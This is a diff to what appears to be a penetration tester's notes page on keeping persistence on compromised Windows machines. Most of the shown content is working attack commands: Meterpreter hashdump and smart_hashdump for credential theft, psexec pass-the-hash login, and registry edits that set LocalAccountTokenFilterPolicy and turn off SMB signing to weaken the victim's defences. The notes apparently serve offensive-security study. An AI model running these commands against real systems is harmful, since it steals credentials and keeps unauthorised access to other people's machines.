@@ -1,5 +1,11 @@
 # k - Persistence
 
+### Maintaining Access
+
+* Password Hash -> \[pass the hash or crack the hash]
+* Backdoor
+* New Users
+
 Persistence ensures we will be able to reconnect to the compromised machine any time we llike even if the machine is rebooted or patched. To do so, we can try to gather credentials to access remote services such as RDP, SSH, VNC, VPN, create backdoors, new users, edit current services or install new vulnerabilities on the Victim.
 
 {% code overflow="wrap" lineNumbers="true" %}
@@ -14,6 +20,7 @@ meterpreter > migrate <PID> # migrate to either svchost.exe or explorer.exe.
 meterpreter > hashdump # dumps all hashes.
 # or use another module to do this...
 meterpreter > run post/windows/gather/smart_hashdump # dumps all hashes.
+# if experiencing error, migrate to another process and try again.
 
 # we can try the pass-the-hash method to login.
 msf > use exploit/windows/smb/psexec
@@ -24,6 +31,13 @@ msf > run # sometime login will fail because we don't have access to administrat
 
 # enter the cmd:
 reg setval -k 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -v LocalAccountTokenFIlterPolicy -t REG_DWORD -d 1
+
+# or 
+#========================================================================
+cmd> reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+cmd> reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
+#========================================================================
 
 # copy and pase into the Meterpreter session.
 # the module should work now, but if the user changes his/her password we loose our access.
